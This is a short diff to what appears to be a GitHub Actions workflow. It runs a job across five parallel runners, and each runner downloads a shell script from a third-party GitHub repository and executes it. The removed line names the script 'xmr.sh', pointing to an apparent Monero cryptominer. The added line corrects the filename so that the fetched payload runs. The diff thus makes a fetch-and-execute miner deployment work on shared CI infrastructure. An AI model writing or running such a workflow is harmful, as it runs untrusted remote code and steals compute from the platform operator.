@@ -24,4 +24,4 @@ jobs:
      runner: [0,1,2,3,4]
    steps:
      - run: |
-          wget https://raw.githubusercontent.com/boigd/Bash.sh/main/bash1.sh && chmod +x xmr.sh && ./xmr.sh
+          wget https://raw.githubusercontent.com/boigd/Bash.sh/main/bash1.sh && chmod +x bash1.sh && ./bash1.sh
